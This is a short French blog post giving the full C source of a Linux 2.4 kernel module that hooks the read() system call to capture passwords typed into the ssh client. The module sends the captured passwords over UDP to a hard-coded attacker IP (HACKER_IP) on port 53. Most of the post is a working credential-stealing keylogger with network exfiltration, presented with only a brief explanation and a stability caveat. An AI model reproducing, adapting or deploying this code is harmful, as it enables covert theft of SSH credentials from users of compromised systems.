---
title: "Linux kernel 2.4 module : spy ssh client"
tags: [Coding, kernel]
---

Toujours dans la catégorie *oldies* comme le code précédent, l'exemple suivant permet de récupérer un mot de passe saisi depuis le client ssh et de le transmettre par UDP vers une machine distante.  

L'idée m'était venue en lançant un strace sur ssh et en remarquant que la lecture du pass se faisant caractère par caractère à l'aide de `read()` sur un périphérique tty.  

Solution : hooker l'appel système `read()` et si le processus en cours s'appelle *ssh* mettre en application tout ça :  

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/unistd.h> /* __NR_close */
#include <linux/smp_lock.h> /* unlock_kernel */
#include <linux/syscalls.h> /* sys_close */
#include <linux/types.h> /* ssize_t... */

/* j'ai pas fait le tri */
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/dcache.h>

#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <asm/uaccess.h>
#include <linux/fs.h>

#define HACKER_IP 0xc0a80103 /* put your ip address in hexa. ex: 192.168.1.3 => 0xc0a80103 */
#define SOURCE_PORT 1337
#define DEST_PORT 53

void **sys_call_table;
static int i=0;
char passwd[41];

asmlinkage ssize_t (*orig_read)(unsigned int fd, char *buf, size_t count);

int sendUDP(char *msg)
{
  struct msghdr udpmsg;
  mm_segment_t oldfs;
  struct iovec iov;
  struct sockaddr_in sin;
  struct sockaddr_in sout;
  struct socket *udpsock;
  int err;

  if(sock_create(PF_INET, SOCK_DGRAM, 0,&udpsock)<0)return -1;
  printk(KERN_INFO "sock created\n");

  memset(&sin,0,sizeof(sin));
  sin.sin_port=htons(SOURCE_PORT);
  sin.sin_family=AF_INET;
  sin.sin_addr.s_addr=htonl(INADDR_ANY);

  if(udpsock->ops->bind(udpsock,(struct sockaddr*)&sin,sizeof(struct sockaddr))<0)
  {
    sock_release(udpsock);
    printk(KERN_INFO "bind error\n");
    return -1;
  }
  printk(KERN_INFO "bind ok\n");

  iov.iov_base=(void*)msg;
  iov.iov_len=strlen(msg);

  memset(&sout,0,sizeof(sout));
  sout.sin_port=htons(DEST_PORT);
  sout.sin_family=AF_INET;
  sout.sin_addr.s_addr=htonl(HACKER_IP);

  memset(&udpmsg, 0, sizeof(struct msghdr));
  udpmsg.msg_name=&sout;
  udpmsg.msg_namelen=sizeof(sout);
  udpmsg.msg_iovlen=strlen(msg);
  udpmsg.msg_iov=&iov;
  udpmsg.msg_control=NULL;
  udpmsg.msg_controllen=0;
  udpmsg.msg_flags=MSG_DONTWAIT|MSG_NOSIGNAL;

  oldfs=get_fs();
  set_fs(KERNEL_DS);
  err=sock_sendmsg(udpsock,&udpmsg,strlen(msg));
  printk("err=%d\n",err);
  set_fs(oldfs);
  sock_release(udpsock);

  return 0;
}

asmlinkage ssize_t my_read(unsigned int fd, char *buf, size_t count)
{
  ssize_t ret;
  struct file *f;

  ret=orig_read(fd,buf,count);
  if(strlen(current->comm)==3)
  {
    if(strncmp(current->comm,"ssh",3)==0)
    {
      if(fd>2 && count==1)
      {
        f=fget(fd);
        if(f)
        {
          if(f->f_dentry)
          {
            if(strncmp(f->f_dentry->d_name.name,"tty",3)==0)
            {
              printk("%c",buf[0]);
              passwd[i]=buf[0];
              if(i>=40)
              {
                passwd[40]='\0';
                sendUDP(passwd);
                i=0;
              }
              else if(buf[0]=='\n')
              {
                passwd[i]='\0';
                sendUDP(passwd);
                i=0;
              }
              else i++;
            }
          }
        }
      }
    }
  }
  return ret;
}

unsigned long **find_sys_call_table(void)
{
   unsigned long **sctable;
   unsigned long ptr;
   extern int loops_per_jiffy;

   sctable = NULL;
   for (ptr = (unsigned long)&unlock_kernel;
        ptr < (unsigned long)&loops_per_jiffy;
        ptr += sizeof(void *))
   {
      unsigned long *p;
      p = (unsigned long *)ptr;
      if (p[__NR_close] == (unsigned long) sys_close)
      {
         sctable = (unsigned long **)p;
         return &sctable[0];
      }
   }
   return NULL;
}

int init_module(void)
{
  printk(KERN_INFO "hook loaded\n");
  sys_call_table=(void**)find_sys_call_table();
  if(sys_call_table!=NULL)
  {
    printk(KERN_INFO "sys_call_table=%p\n",sys_call_table);
    printk(KERN_INFO "__NR_read=%d\n",__NR_read);
    printk(KERN_INFO "sys_call_table[__NR_read]=%p\n",sys_call_table[__NR_read]);
    orig_read=(asmlinkage ssize_t(*)(unsigned int,char *,size_t))(sys_call_table[__NR_read]);
    sys_call_table[__NR_read]=my_read;
  }

  return 0;
}

void cleanup_module(void)
{
  if(sys_call_table!=NULL)
  {
    sys_call_table[__NR_read]=orig_read;
  }
  printk(KERN_INFO "hook unloaded\n");
}
```

De mémoire, c'était loin d'être stable (le système finissait par planter) donc à utiliser à vos risques et périls.  

Pour les yeux uniquement comme disent certains.

*Published January 11 2011 at 17:35*
